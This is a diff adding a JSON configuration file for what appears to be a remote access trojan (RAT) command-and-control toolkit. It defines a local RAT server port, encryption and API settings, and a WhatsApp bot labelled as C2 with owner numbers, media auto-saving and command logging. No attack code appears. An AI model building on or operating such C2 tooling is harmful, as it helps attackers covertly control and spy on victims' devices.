@@ -1,0 +1,23 @@
+{
+  "_comment": "This file is maintained for backward compatibility. Primary config is umbrella_config.yaml in workspace root.",
+  "ratServer": {
+    "host": "127.0.0.1",
+    "port": 4444,
+    "encryptionKey": "generated_at_setup",
+    "apiPort": 5000,
+    "_note": "These values are read from umbrella_config.yaml at runtime"
+  },
+  "whatsapp": {
+    "botName": "T0OL-B4S3-263 C2",
+    "prefix": "/",
+    "ownerNumbers": []
+  },
+  "features": {
+    "autoSaveMedia": true,
+    "maxCommandTimeout": 60000,
+    "enableNotifications": true,
+    "enableHistory": true,
+    "enableAudit": true,
+    "logsDirectory": "logs/whatsapp-c2"
+  }
+}
